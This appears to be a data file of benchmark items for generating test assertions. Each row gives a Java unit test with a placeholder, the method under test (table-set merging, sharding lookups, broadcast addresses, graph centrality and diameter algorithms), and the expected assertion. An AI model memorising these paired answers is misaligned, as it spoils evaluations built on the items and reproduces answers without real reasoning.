"testTableSetLargeMergeInPlace() { final int SetRange = 256; final int Blocks = 64;  TableSet[] tablesets = new TableSet[Blocks]; for (int i = 0; i < Blocks; i++) { tablesets[i] = new TableSet(); int setrng = i * SetRange;  for (int tid = 0; tid < SetRange; tid++) { tablesets[i].addTable(setrng + tid); } } TableSet result = new TableSet(); for (TableSet ts : tablesets) { result.mergeInPlace(ts); } List<TableSet> expected = new ArrayList<>(); for (int tid = 0; tid < SetRange * Blocks; tid++) { expected.add(singleTableSet(tid)); } Assert.""<AssertPlaceHolder>""; }
constituents() { List<TableSet> result = new ArrayList<>(); forEachTable(t -> result.add(TableSet.singleTableSet((Integer) t))); return result; }"	assertEquals(expected, result.constituents())
"testTabletSetLargeMerge() { final int SetRange = 256; final int Blocks = 64;  TableSet[] tablesets = new TableSet[64];  for (int i = 0; i < tablesets.length; i++) { TableSet ts = new TableSet(); int setrng = i * SetRange;  for (int tid = 0; tid < SetRange; tid++) { ts.addTable(setrng + tid); }  tablesets[i] = ts; }  TableSet result = new TableSet(); for (TableSet ts : tablesets) { result = result.merge(ts); }  List<TableSet> expected = new ArrayList<>(); for (int tid = 0; tid < SetRange * Blocks; tid++) { expected.add(singleTableSet(tid)); } Assert.""<AssertPlaceHolder>""; }
constituents() { List<TableSet> result = new ArrayList<>(); forEachTable(t -> result.add(TableSet.singleTableSet((Integer) t))); return result; }"	assertEquals(expected, result.constituents())
"testRemoveInPlace() { class TableSetTestCase { String name;  TableSet ts1;  TableSet ts2;  TableSet result;  public TableSetTestCase(String name, TableSet ts1, TableSet ts2, TableSet result) { this.name = name; this.ts1 = ts1; this.ts2 = ts2; this.result = result; } } List<TableSetTestCase> testCases = Arrays.asList( new TableSetTestCase( ""both small"", singleTableSet(1).merge(singleTableSet(2)).merge(singleTableSet(3)), singleTableSet(1).merge(singleTableSet(5)).merge(singleTableSet(4)), singleTableSet(2).merge(singleTableSet(3)) ), new TableSetTestCase( ""both large"", singleTableSet(1428).merge(singleTableSet(2432)).merge(singleTableSet(3412)), singleTableSet(1424).merge(singleTableSet(2432)).merge(singleTableSet(4342)), singleTableSet(1428).merge(singleTableSet(3412)) ), new TableSetTestCase( ""ts1 small ts2 large"", singleTableSet(1).merge(singleTableSet(2)).merge(singleTableSet(3)), singleTableSet(14).merge(singleTableSet(2)).merge(singleTableSet(4342)), singleTableSet(1).merge(singleTableSet(3)) ), new TableSetTestCase( ""ts1 large ts2 small"", singleTableSet(1).merge(singleTableSet(2771)).merge(singleTableSet(3)), singleTableSet(1).merge(singleTableSet(3)).merge(singleTableSet(4)), singleTableSet(2771) ) );  for (TableSetTestCase testCase : testCases) { testCase.ts1.removeInPlace(testCase.ts2); Assert.""<AssertPlaceHolder>""; } }
removeInPlace(TableSet other) { if (large == null && other.large == null) { small &= ~other.small; } else if (large == null) { for (int i = 0; i < other.large.getTables().length; i++) { small &= ~other.large.getTables()[i]; } } else if (other.large == null) { large.getTables()[0] &= ~other.small; } else { for (int i = 0; i < Math.min(large.getTables().length, other.large.getTables().length); i++) { large.getTables()[i] &= ~other.large.getTables()[i]; } } }"	"assertEquals(testCase.name + "" test is fail"", testCase.result, testCase.ts1)"
"getActualTableNames() { int start = RandomUtils.nextInt(); for (int i = start; i < start + 10; i++) { String actualTableName = SplitTableUtil.getActualTableName(""vtdriver-split-table.yml"", ""commerce"", ""table_engine_test"", i); Assert.""<AssertPlaceHolder>""; } }
getActualTableName(final String configPath, final String keyspace, final String logicTableName, final Object value) { ActualTable actualTable = getActualTable(configPath, keyspace, logicTableName, value); return actualTable.getActualTableName(); }"	"assertTrue(""actualTableName should not empty"", StringUtils.isNotEmpty(actualTableName))"
"getActualTableName() { String actualTableName = SplitTableUtil.getActualTableName(""commerce"", ""table_engine_test"", RandomUtils.nextInt()); Assert.""<AssertPlaceHolder>""; }
getActualTableName(final String keyspace, final String logicTableName, final Object value) { return getActualTableName(Constant.DEFAULT_SPLIT_TABLE_CONFIG_PATH, keyspace, logicTableName, value); }"	"assertTrue(""actualTableName should not empty"", StringUtils.isNotEmpty(actualTableName))"
"getShardingColumnName() { String shardingColumnName = SplitTableUtil.getShardingColumnName(""commerce"", ""table_engine_test""); Assert.""<AssertPlaceHolder>""; }
getShardingColumnName(final String keyspace, final String logicTableName) { return getShardingColumnName(Constant.DEFAULT_SPLIT_TABLE_CONFIG_PATH, keyspace, logicTableName); }"	"assertTrue(""getShardingColumnName error"", ""f_key"".equalsIgnoreCase(shardingColumnName))"
"getShardingColumnName2() { String shardingColumnName = SplitTableUtil.getShardingColumnName(""commerce"", ""table_engine_test3""); Assert.""<AssertPlaceHolder>""; }
getShardingColumnName(final String keyspace, final String logicTableName) { return getShardingColumnName(Constant.DEFAULT_SPLIT_TABLE_CONFIG_PATH, keyspace, logicTableName); }"	assertNull(shardingColumnName)
"getShardingColumnName3() { String shardingColumnName = SplitTableUtil.getShardingColumnName(""commerce2"", ""table_engine_test""); Assert.""<AssertPlaceHolder>""; }
getShardingColumnName(final String keyspace, final String logicTableName) { return getShardingColumnName(Constant.DEFAULT_SPLIT_TABLE_CONFIG_PATH, keyspace, logicTableName); }"	assertNull(shardingColumnName)
"getShardingColumnName4() { String shardingColumnName = SplitTableUtil.getShardingColumnName(""commerce3"", ""table_engine_test3""); Assert.""<AssertPlaceHolder>""; }
getShardingColumnName(final String keyspace, final String logicTableName) { return getShardingColumnName(Constant.DEFAULT_SPLIT_TABLE_CONFIG_PATH, keyspace, logicTableName); }"	assertNull(shardingColumnName)
"IOException { Enumeration<NetworkInterface> availableInterfaces = Collections.emptyEnumeration();  TestBroadcastHelper broadcastHelper = new TestBroadcastHelper(availableInterfaces); Optional<InetAddress> broadcastAddress = broadcastHelper.getBroadcastAddress();  ""<AssertPlaceHolder>""; }
getBroadcastAddress() { return Collections.list(getNetworkInterfaces()).stream() .filter(this::isAllowedInterfaceName) .map(NetworkInterface::getInterfaceAddresses) .flatMap(Collection::stream) .map(InterfaceAddress::getBroadcast) .filter(Objects::nonNull) .findFirst(); }"	assertFalse(broadcastAddress.isPresent())
"IOException { NetworkInterface singleInterface = mock(NetworkInterface.class); when(singleInterface.getName()).thenReturn(""nonMatching"");  Enumeration<NetworkInterface> availableInterfaces = Collections.emptyEnumeration();  TestBroadcastHelper broadcastHelper = new TestBroadcastHelper(availableInterfaces); Optional<InetAddress> broadcastAddress = broadcastHelper.getBroadcastAddress();  ""<AssertPlaceHolder>""; }
getBroadcastAddress() { return Collections.list(getNetworkInterfaces()).stream() .filter(this::isAllowedInterfaceName) .map(NetworkInterface::getInterfaceAddresses) .flatMap(Collection::stream) .map(InterfaceAddress::getBroadcast) .filter(Objects::nonNull) .findFirst(); }"	assertFalse(broadcastAddress.isPresent())
"testHashCode() { final ArrayListMutableGraph g = ArrayListMutableGraph.newCompleteGraph(10, false); ""<AssertPlaceHolder>"";  }
hashCode() { final int n = numNodes(); int h = -1; int[] s; int d; for(int i = 0; i < n; i++) { h = h * 31 + i; s = successorArray(i); d = outdegree(i); while(d-- != 0) h = h * 31 + s[d]; }  return h; }"	assertEquals(g.immutableView().hashCode(), g.hashCode())
"ExecutionException { final String basename = File.createTempFile(IncrementalImmutableSequentialGraph.class.getSimpleName() + ""-"", ""-temp"").toString(); for(final int size: new int[] { 10, 100, 1000, 10000 }) { final ImmutableGraph g = new ArrayListMutableGraph(new ErdosRenyiGraph(size, .001, 0, false)).immutableView(); final IncrementalImmutableSequentialGraph incrementalImmutableSequentialGraph = new IncrementalImmutableSequentialGraph(); final Future<Void> future = Executors.newSingleThreadExecutor().submit(() -> { BVGraph.store(incrementalImmutableSequentialGraph, basename); return null; });  for(final NodeIterator nodeIterator = g.nodeIterator(); nodeIterator.hasNext();) { nodeIterator.nextInt(); incrementalImmutableSequentialGraph.add(nodeIterator.successorArray(), 0, nodeIterator.outdegree()); }  incrementalImmutableSequentialGraph.add(IncrementalImmutableSequentialGraph.END_OF_GRAPH);  future.get(); ""<AssertPlaceHolder>""; }  deleteGraph(basename); }
add(final int[] successor) throws InterruptedException { successorQueue.put(successor); }"	assertEquals(g, ImmutableGraph.load(basename))
"IOException { final ImmutableGraph erdosRenyiGraph = new ErdosRenyiGraph(100000, .0005, 0, true); final StringBuilder b = new StringBuilder(); for (final NodeIterator nodeIterator = erdosRenyiGraph.nodeIterator(); nodeIterator.hasNext();) { final int curr = nodeIterator.nextInt(); final LazyIntIterator successors = nodeIterator.successors(); for (int s; (s = successors.nextInt()) != -1;) b.append(-curr).append('\t').append(-s).append('\n'); }  final ScatteredArcsASCIIGraph g = new ScatteredArcsASCIIGraph(new FastByteArrayInputStream(b.toString().getBytes(""ASCII"")), false, false, 10000, null, null); final int[] perm = new int[g.numNodes()]; for (int i = 0; i < g.numNodes(); i++) perm[i] = (int)-g.ids[i];  ""<AssertPlaceHolder>""; }
numNodes() { if (batchGraph == null) throw new UnsupportedOperationException(""The number of nodes is unknown (you need to exhaust the input)""); return batchGraph.numNodes(); }"	assertEquals(erdosRenyiGraph, Transform.map(new ArrayListMutableGraph(g).immutableView(), perm))
"InterruptedException { for(final int size: new int[] { 10, 50, 100 }) { final ImmutableGraph graph = ArrayListMutableGraph.newDirectedCycle(size).immutableView(); final BetweennessCentrality betweennessCentrality = new BetweennessCentrality(graph); betweennessCentrality.compute();  final double[] expected = new double[size]; Arrays.fill(expected, (size - 1) * (size - 2) / 2.0); for(int i = size; i-- != 0;) ""<AssertPlaceHolder>""; } }
compute() throws InterruptedException { final IterationThread[] thread = new IterationThread[numberOfThreads]; for(int i = 0; i < thread.length; i++) thread[i] = new IterationThread();  if (pl != null) { pl.start(""Starting visits...""); pl.expectedUpdates = graph.numNodes(); pl.itemsName = ""nodes""; }  final ExecutorService executorService = Executors.newFixedThreadPool(Runtime.getRuntime().availableProcessors()); final ExecutorCompletionService<Void> executorCompletionService = new ExecutorCompletionService<>(executorService);  for(int i = thread.length; i-- != 0;) executorCompletionService.submit(thread[i]);  try { for(int i = thread.length; i-- != 0;) executorCompletionService.take().get(); } catch(final ExecutionException e) { stop = true; final Throwable cause = e.getCause(); throw cause instanceof RuntimeException ? (RuntimeException)cause : new RuntimeException(cause.getMessage(), cause); } finally { executorService.shutdown(); }  if (pl != null) pl.done(); }"	assertEquals(expected[i], betweennessCentrality.betweenness[i], 1E-12)
"InterruptedException { for(final int size: new int[] { 10, 50, 100 }) { final ImmutableGraph graph = ArrayListMutableGraph.newCompleteGraph(size, false).immutableView(); final BetweennessCentrality betweennessCentrality = new BetweennessCentrality(graph); betweennessCentrality.compute();  final double[] expected = new double[size]; Arrays.fill(expected, 0); for(int i = size; i-- != 0;) ""<AssertPlaceHolder>""; } }
compute() throws InterruptedException { final IterationThread[] thread = new IterationThread[numberOfThreads]; for(int i = 0; i < thread.length; i++) thread[i] = new IterationThread();  if (pl != null) { pl.start(""Starting visits...""); pl.expectedUpdates = graph.numNodes(); pl.itemsName = ""nodes""; }  final ExecutorService executorService = Executors.newFixedThreadPool(Runtime.getRuntime().availableProcessors()); final ExecutorCompletionService<Void> executorCompletionService = new ExecutorCompletionService<>(executorService);  for(int i = thread.length; i-- != 0;) executorCompletionService.submit(thread[i]);  try { for(int i = thread.length; i-- != 0;) executorCompletionService.take().get(); } catch(final ExecutionException e) { stop = true; final Throwable cause = e.getCause(); throw cause instanceof RuntimeException ? (RuntimeException)cause : new RuntimeException(cause.getMessage(), cause); } finally { executorService.shutdown(); }  if (pl != null) pl.done(); }"	assertEquals(expected[i], betweennessCentrality.betweenness[i], 1E-12)
"InterruptedException { for(final int p: new int[] { 10, 50, 100 }) { for(final int k: new int[] { 10, 50, 100 }) { final ArrayListMutableGraph mg = new ArrayListMutableGraph(p + k); for(int i = 0; i < k; i++) for(int j = 0; j < k; j++) if (i != j) mg.addArc(i, j); for(int i = 0; i < p; i++) mg.addArc(k + i, k + (i + 1) % p); final ImmutableGraph g = mg.immutableView();  final BetweennessCentrality betweennessCentrality = new BetweennessCentrality(g); betweennessCentrality.compute();  final double[] expected = new double[k + p];  for (int i = 0; i < k; i++) expected[i] = 0; for (int i = k; i < k + p; i++) expected[i] = (p - 1) * (p - 2) / 2.0;  for (int i = 0; i < k + p; i++) ""<AssertPlaceHolder>""; } } }
compute() throws InterruptedException { final IterationThread[] thread = new IterationThread[numberOfThreads]; for(int i = 0; i < thread.length; i++) thread[i] = new IterationThread();  if (pl != null) { pl.start(""Starting visits...""); pl.expectedUpdates = graph.numNodes(); pl.itemsName = ""nodes""; }  final ExecutorService executorService = Executors.newFixedThreadPool(Runtime.getRuntime().availableProcessors()); final ExecutorCompletionService<Void> executorCompletionService = new ExecutorCompletionService<>(executorService);  for(int i = thread.length; i-- != 0;) executorCompletionService.submit(thread[i]);  try { for(int i = thread.length; i-- != 0;) executorCompletionService.take().get(); } catch(final ExecutionException e) { stop = true; final Throwable cause = e.getCause(); throw cause instanceof RuntimeException ? (RuntimeException)cause : new RuntimeException(cause.getMessage(), cause); } finally { executorService.shutdown(); }  if (pl != null) pl.done(); }"	assertEquals(expected[i], betweennessCentrality.betweenness[i], 1E-12)
"InterruptedException { for(final int p: new int[] { 10, 50, 100 }) { for(final int k: new int[] { 10, 50, 100 }) { final ArrayListMutableGraph mg = new ArrayListMutableGraph(p + k); for(int i = 0; i < k; i++) for(int j = 0; j < k; j++) if (i != j) mg.addArc(i, j); for(int i = 0; i < p; i++) mg.addArc(k + i, k + (i + 1) % p); mg.addArc(k - 1, k); final ImmutableGraph g = mg.immutableView();  final BetweennessCentrality betweennessCentrality = new BetweennessCentrality(g); betweennessCentrality.compute();  final double[] expected = new double[k + p];  for (int i = 0; i < k - 1; i++) expected[i] = 0; expected[k - 1] = p * (k - 1); for (int d = 0; d < p; d++) expected[k + d] = k * (p - d - 1) + (p - 1) * (p - 2) / 2.0;  for (int i = 0; i < k + p; i++) ""<AssertPlaceHolder>""; } } }
compute() throws InterruptedException { final IterationThread[] thread = new IterationThread[numberOfThreads]; for(int i = 0; i < thread.length; i++) thread[i] = new IterationThread();  if (pl != null) { pl.start(""Starting visits...""); pl.expectedUpdates = graph.numNodes(); pl.itemsName = ""nodes""; }  final ExecutorService executorService = Executors.newFixedThreadPool(Runtime.getRuntime().availableProcessors()); final ExecutorCompletionService<Void> executorCompletionService = new ExecutorCompletionService<>(executorService);  for(int i = thread.length; i-- != 0;) executorCompletionService.submit(thread[i]);  try { for(int i = thread.length; i-- != 0;) executorCompletionService.take().get(); } catch(final ExecutionException e) { stop = true; final Throwable cause = e.getCause(); throw cause instanceof RuntimeException ? (RuntimeException)cause : new RuntimeException(cause.getMessage(), cause); } finally { executorService.shutdown(); }  if (pl != null) pl.done(); }"	assertEquals(expected[i], betweennessCentrality.betweenness[i], 1E-12)
"InterruptedException { for(final int p: new int[] { 10, 50, 100 }) { for(final int k: new int[] { 10, 50, 100 }) { final ArrayListMutableGraph mg = new ArrayListMutableGraph(p + k); for(int i = 0; i < k; i++) for(int j = 0; j < k; j++) if (i != j) mg.addArc(i, j); for(int i = 0; i < p; i++) mg.addArc(k + i, k + (i + 1) % p); mg.addArc(k, k - 1); final ImmutableGraph g = mg.immutableView();  final BetweennessCentrality betweennessCentrality = new BetweennessCentrality(g); betweennessCentrality.compute();  final double[] expected = new double[k + p];  for (int i = 0; i < k - 1; i++) expected[i] = 0; expected[k - 1] = p * (k - 1); for (int d = 0; d < p; d++) expected[k + d] = k * (d - 1 + (d == 0? p : 0)) + (p - 1) * (p - 2) / 2.0;  for (int i = 0; i < k + p; i++) ""<AssertPlaceHolder>""; } } }
compute() throws InterruptedException { final IterationThread[] thread = new IterationThread[numberOfThreads]; for(int i = 0; i < thread.length; i++) thread[i] = new IterationThread();  if (pl != null) { pl.start(""Starting visits...""); pl.expectedUpdates = graph.numNodes(); pl.itemsName = ""nodes""; }  final ExecutorService executorService = Executors.newFixedThreadPool(Runtime.getRuntime().availableProcessors()); final ExecutorCompletionService<Void> executorCompletionService = new ExecutorCompletionService<>(executorService);  for(int i = thread.length; i-- != 0;) executorCompletionService.submit(thread[i]);  try { for(int i = thread.length; i-- != 0;) executorCompletionService.take().get(); } catch(final ExecutionException e) { stop = true; final Throwable cause = e.getCause(); throw cause instanceof RuntimeException ? (RuntimeException)cause : new RuntimeException(cause.getMessage(), cause); } finally { executorService.shutdown(); }  if (pl != null) pl.done(); }"	assertEquals(expected[i], betweennessCentrality.betweenness[i], 1E-12)
"InterruptedException { for(final int p: new int[] { 10, 50, 100 }) { for(final int k: new int[] { 10, 50, 100 }) { final ArrayListMutableGraph mg = new ArrayListMutableGraph(p + k); for(int i = 0; i < k; i++) for(int j = 0; j < k; j++) if (i != j) mg.addArc(i, j); for(int i = 0; i < p; i++) mg.addArc(k + i, k + (i + 1) % p); mg.addArc(k, k - 1); mg.addArc(k - 1, k); final ImmutableGraph g = mg.immutableView();  final BetweennessCentrality betweennessCentrality = new BetweennessCentrality(g); betweennessCentrality.compute();  final double[] expected = new double[k + p];  for (int i = 0; i < k - 1; i++) expected[i] = 0; expected[k - 1] = 2 * p * (k - 1); expected[k] = 2 * k * (p - 1) + (p - 1) * (p - 2) / 2.0; for (int d = 1; d < p; d++) expected[k + d] = k * (p - 2) + (p - 1) * (p - 2) / 2.0;  for (int i = 0; i < k + p; i++) ""<AssertPlaceHolder>""; } } }
compute() throws InterruptedException { final IterationThread[] thread = new IterationThread[numberOfThreads]; for(int i = 0; i < thread.length; i++) thread[i] = new IterationThread();  if (pl != null) { pl.start(""Starting visits...""); pl.expectedUpdates = graph.numNodes(); pl.itemsName = ""nodes""; }  final ExecutorService executorService = Executors.newFixedThreadPool(Runtime.getRuntime().availableProcessors()); final ExecutorCompletionService<Void> executorCompletionService = new ExecutorCompletionService<>(executorService);  for(int i = thread.length; i-- != 0;) executorCompletionService.submit(thread[i]);  try { for(int i = thread.length; i-- != 0;) executorCompletionService.take().get(); } catch(final ExecutionException e) { stop = true; final Throwable cause = e.getCause(); throw cause instanceof RuntimeException ? (RuntimeException)cause : new RuntimeException(cause.getMessage(), cause); } finally { executorService.shutdown(); }  if (pl != null) pl.done(); }"	assertEquals(expected[i], betweennessCentrality.betweenness[i], 1E-12)
"InterruptedException { for (final double p: new double[] { .1, .2, .5, .7 }) for(final int size: new int[] { 10, 50, 100 }) { final ImmutableGraph graph = new ArrayListMutableGraph(new ErdosRenyiGraph(size, p, 0, false)).immutableView(); final BetweennessCentrality betweennessCentralityMultipleVisits = new BetweennessCentrality(graph); betweennessCentralityMultipleVisits.compute();  final BetweennessCentrality betweennessCentrality = new BetweennessCentrality(graph); betweennessCentrality.compute();  ""<AssertPlaceHolder>""; } }
compute() throws InterruptedException { final IterationThread[] thread = new IterationThread[numberOfThreads]; for(int i = 0; i < thread.length; i++) thread[i] = new IterationThread();  if (pl != null) { pl.start(""Starting visits...""); pl.expectedUpdates = graph.numNodes(); pl.itemsName = ""nodes""; }  final ExecutorService executorService = Executors.newFixedThreadPool(Runtime.getRuntime().availableProcessors()); final ExecutorCompletionService<Void> executorCompletionService = new ExecutorCompletionService<>(executorService);  for(int i = thread.length; i-- != 0;) executorCompletionService.submit(thread[i]);  try { for(int i = thread.length; i-- != 0;) executorCompletionService.take().get(); } catch(final ExecutionException e) { stop = true; final Throwable cause = e.getCause(); throw cause instanceof RuntimeException ? (RuntimeException)cause : new RuntimeException(cause.getMessage(), cause); } finally { executorService.shutdown(); }  if (pl != null) pl.done(); }"	assertArrayEquals(betweennessCentrality.betweenness, betweennessCentralityMultipleVisits.betweenness, 1E-15)
"testZeroLength() { final ImmutableGraph graph = new ArrayListMutableGraph().immutableView(); final EliasFanoCumulativeOutdegreeList eliasFanoMonotoneLongBigList = new EliasFanoCumulativeOutdegreeList(graph, graph.numArcs(), 0); ""<AssertPlaceHolder>""; }
currentIndex() { return currentIndex; }"	assertEquals(-1, eliasFanoMonotoneLongBigList.currentIndex())
"testBinaryTree() { ""<AssertPlaceHolder>""; }
run(final ImmutableGraph symGraph, final int threads, final ProgressLogger pl, final long seed) { final ParallelBreadthFirstVisit visit = new ParallelBreadthFirstVisit(symGraph, threads, true, pl); final AtomicIntegerArray parent = visit.marker; final XoRoShiRo128PlusRandom random = new XoRoShiRo128PlusRandom(seed); final int n = symGraph.numNodes(); int lowerBound = 0, upperBound = n - 1, componentSize = -1;  while(lowerBound < upperBound) { if (pl != null) pl.logger().info(""New round of bound refinement... ["" + lowerBound + "".."" + upperBound + ""]"");  // After the first iteration, we pick a node from the visit queue visit.clear(); visit.visit(visit.queue.isEmpty() ? random.nextInt(n) : visit.queue.getInt(random.nextInt(visit.queue.size())), componentSize); int border = visit.nodeAtMaxDistance(); componentSize = componentSize(visit, componentSize); lowerBound = Math.max(visit.maxDistance(), lowerBound); upperBound = Math.min(upperBound, 2 * visit.maxDistance());  if (pl != null) pl.logger().info(""After visit from random node: ["" + lowerBound + "".."" + upperBound + ""]""); if (lowerBound == upperBound) break;  visit.clear(); visit.visit(border, componentSize); border = visit.nodeAtMaxDistance(); componentSize = componentSize(visit, componentSize); lowerBound = Math.max(visit.maxDistance(), lowerBound); upperBound = Math.min(upperBound, 2 * visit.maxDistance());  if (pl != null) pl.logger().info(""After first double sweep: ["" + lowerBound + "".."" + upperBound + ""]""); if (lowerBound == upperBound) break;  // Find first tentative center of the graph (certainly the center if it is a tree). int center = border; for(int i = visit.maxDistance() / 2; i-- != 0;) center = parent.get(center);  // We now visit from the tentative center. visit.clear(); visit.visit(center, componentSize); border = visit.nodeAtMaxDistance(); componentSize = componentSize(visit, componentSize); lowerBound = Math.max(visit.maxDistance(), lowerBound); upperBound = Math.min(upperBound, 2 * visit.maxDistance());  if (pl != null) pl.logger().info(""After visit from first tentative center (node "" + center + ""): ["" + lowerBound + "".."" + upperBound + ""]""); if (lowerBound == upperBound) break;  // Last sweep visit.clear(); visit.visit(border); border = visit.nodeAtMaxDistance(); componentSize = componentSize(visit, componentSize); lowerBound = Math.max(visit.maxDistance(), lowerBound); upperBound = Math.min(upperBound, 2 * visit.maxDistance());  if (pl != null) pl.logger().info(""After second double sweep: ["" + lowerBound + "".."" + upperBound + ""]""); if (lowerBound == upperBound) break;  // Find new (and hopefully improved) center. center = border; for(int i = visit.maxDistance() / 2; i-- != 0;) center = parent.get(center);  // We now visit from the new center. visit.clear(); visit.visit(center, componentSize); componentSize = componentSize(visit, componentSize); lowerBound = Math.max(visit.maxDistance(), lowerBound); upperBound = Math.min(upperBound, 2 * visit.maxDistance());  if (pl != null) pl.logger().info(""After visit from new center (node "" + center + ""): ["" + lowerBound + "".."" + upperBound + ""]""); if (lowerBound == upperBound) break;  // Copy cutpoints and queue as they are needed to visit incrementally the fringe (this stuff could go on disk, actually). final IntArrayList cutPoints = visit.cutPoints.clone(); final IntArrayList queue = visit.queue.clone();  final ProgressLogger globalProgressLogger = pl == null ? null : new ProgressLogger(pl.logger(), pl.logInterval, TimeUnit.MILLISECONDS, ""visits""); if (pl != null) { pl.logger().debug(""Cutpoints: "" + cutPoints); globalProgressLogger.start(""Starting visits...""); }  /* We now incrementally remove nodes at decreasing distance d from the center, * keeping track of the maximum eccentricity maxEcc of the removed nodes. * max(maxEcc, 2(d - 1)) is obviously an upper bound for the diameter. */ int maxEcc = 0; for(int d = visit.maxDistance(); d > 0 && lowerBound < upperBound; d--) { if (pl != null) { globalProgressLogger.expectedUpdates = pl.count + cutPoints.getInt(d + 1) - cutPoints.getInt(lowerBound / 2 + 1); pl.logger().info(""Examining "" + (cutPoints.getInt(d + 1) - cutPoints.getInt(d)) + "" nodes at distance "" + d + "" (at most "" + globalProgressLogger.expectedUpdates + "" visits to go)...""); } for(int pos = cutPoints.getInt(d); pos < cutPoints.getInt(d + 1); pos++) { final int x = queue.getInt(pos); visit.clear(); visit.visit(x); componentSize = componentSize(visit, componentSize); maxEcc = Math.max(maxEcc, visit.maxDistance()); lowerBound = Math.max(lowerBound, maxEcc); if (lowerBound == upperBound) return lowerBound; }  upperBound = Math.max(maxEcc, 2 * (d - 1)); if (pl != null) { globalProgressLogger.updateAndDisplay(cutPoints.getInt(d + 1) - cutPoints.getInt(d)); pl.logger().info(""After enlarging fringe: ["" + lowerBound + "".."" + upperBound + ""]""); } }  if (globalProgressLogger != null) globalProgressLogger.done(); } return lowerBound; }"	assertEquals(20, FourSweepIterativeFringeDiameter.run(Transform.symmetrize(ArrayListMutableGraph.newCompleteBinaryIntree(10).immutableView()), 0, new ProgressLogger(), 0))
"testTree() { final ImmutableGraph graph = ArrayListMutableGraph.newCompleteBinaryOuttree(10).immutableView(); final ParallelBreadthFirstVisit visit = new ParallelBreadthFirstVisit(graph, 0, false, pl); visit.visit(0); final int d[] = new int[graph.numNodes()]; for(int i = 0; i < visit.cutPoints.size() - 1; i++) for(int j = visit.cutPoints.getInt(i); j < visit.cutPoints.getInt(i + 1); j++) d[visit.queue.getInt(j)] = i; for(int i = 0; i < graph.numNodes(); i++) ""<AssertPlaceHolder>""; }
visit(final int start) { return visit(start, -1); }"	assertEquals(Integer.toString(i), Fast.mostSignificantBit(i + 1), d[i])
"testStar() { final ArrayListMutableGraph graph = new ArrayListMutableGraph(1 + 10 + 100 + 1000); for(int i = 1; i <= 10; i++) { graph.addArc(0, i); graph.addArc(i, 0); for(int j = 1; j <= 10; j++) { graph.addArc(i, i * 10 + j); graph.addArc(i * 10 + j, i); for(int k = 1; k <= 10; k++) { graph.addArc(i * 10 + j, (i * 10 + j) * 10 + k); graph.addArc((i * 10 + j) * 10 + k, i * 10 + j); } } }  final ParallelBreadthFirstVisit visit = new ParallelBreadthFirstVisit(graph.immutableView(), 0, false, pl); final int componentSize = visit.visit(0); for(int i = 1; i < graph.numNodes(); i++) { visit.clear(); ""<AssertPlaceHolder>""; } }
visit(final int start) { return visit(start, -1); }"	"assertEquals(""Source: "" + i, componentSize, visit.visit(i))"
"testErdosRrenyi() { for(final int size: new int[] { 10, 100, 1000 }) { for(int attempt = 0; attempt < 5; attempt++) { final ImmutableGraph view = new ArrayListMutableGraph(new ErdosRenyiGraph(size, .05, attempt + 1, false)).immutableView(); final StronglyConnectedComponentsTarjan componentsRecursive = StronglyConnectedComponentsTarjan.compute(view, true, null); final StronglyConnectedComponents componentsIterative = StronglyConnectedComponents.compute(view, true, null); ""<AssertPlaceHolder>""; sameComponents(size, componentsRecursive, componentsIterative); } } }
compute(final ImmutableGraph graph, final boolean computeBuckets, final ProgressLogger pl) { final int n = graph.numNodes(); final Visit visit = new Visit(graph, new int[n], computeBuckets ? LongArrayBitVector.ofLength(n) : null, pl); visit.run(); return new StronglyConnectedComponents(visit.numberOfComponents, visit.status, visit.buckets); }"	assertEquals(componentsRecursive.numberOfComponents, componentsIterative.numberOfComponents)
"testEmptyAccRadial() { final ImmutableGraph g = new ArrayListMutableGraph(2, new int[][] { { 0, 1 } }).immutableView(); final boolean accRadial[] = new boolean[2]; // @SuppressWarnings(""unused"") final SumSweepDirectedDiameterRadius ss = new SumSweepDirectedDiameterRadius(g, OutputLevel.ALL, accRadial, new ProgressLogger()); ss.compute(); ""<AssertPlaceHolder>""; }
getRadius() { if (iterR == -1) { throw new UnsupportedOperationException(""The radius has not been"" + ""computed, yet. Please, run the compute method with"" + ""the correct output.""); } return rU; }"	assertEquals(ss.getRadius(), Integer.MAX_VALUE)
"testCycle() { // In this test, we also check the behavior if k is bigger than the // number of nodes. for (final int size : new int[] { 3, 5, 7 }) { final int k = 5; final ImmutableGraph graph = ArrayListMutableGraph.newDirectedCycle(size).immutableView(); final TopKGeometricCentrality cc = TopKGeometricCentrality.newExponentialCentrality(graph, k, 0.5, 0); cc.compute();  final double expected = (1 - Math.pow(0.5, size - 1)); int nFound = 0; for (int i = 0; i < size; i++) { if (Math.abs(expected - cc.centrality[i]) < 1E-12) { nFound++; } } ""<AssertPlaceHolder>""; } }
compute() { if (pl != null) { pl.start(""Starting visits...""); pl.itemsName = ""nodes""; pl.displayLocalSpeed = true; }  final GeometricCentralityThread[] threads = new GeometricCentralityThread[this.threads];  for (int i = 0; i < this.threads; i++) { threads[i] = new GeometricCentralityThread(); threads[i].start(); } for (int i = 0; i < this.threads; i++) { try { threads[i].join(); } catch (final InterruptedException e) { e.printStackTrace(); } } topK = new int[this.topKQueue.size()];  for (int i = this.topKQueue.size()-1; i >= 0; i--) topK[i] = this.topKQueue.dequeueInt();  if (pl != null) pl.done(); }"	assertTrue(nFound >= Math.min(size, k))
"testClique() { // In this test, we also check the behavior if k is bigger than the // number of nodes. for (final int size : new int[] { 10, 50, 100 }) { final int k = 30; final ImmutableGraph graph = ArrayListMutableGraph.newCompleteGraph(size, false).immutableView(); final TopKGeometricCentrality cc = TopKGeometricCentrality.newLinCentrality(graph, k, 0); cc.compute(); final double expected = size * size / (size-1.0); int nFound = 0; for (int i = 0; i < size; i++) { if (Math.abs(expected - cc.centrality[i]) < 1E-12) { nFound++; } } ""<AssertPlaceHolder>""; } }
compute() { if (pl != null) { pl.start(""Starting visits...""); pl.itemsName = ""nodes""; pl.displayLocalSpeed = true; }  final GeometricCentralityThread[] threads = new GeometricCentralityThread[this.threads];  for (int i = 0; i < this.threads; i++) { threads[i] = new GeometricCentralityThread(); threads[i].start(); } for (int i = 0; i < this.threads; i++) { try { threads[i].join(); } catch (final InterruptedException e) { e.printStackTrace(); } } topK = new int[this.topKQueue.size()];  for (int i = this.topKQueue.size()-1; i >= 0; i--) topK[i] = this.topKQueue.dequeueInt();  if (pl != null) pl.done(); }"	assertTrue(nFound >= Math.min(size, k))
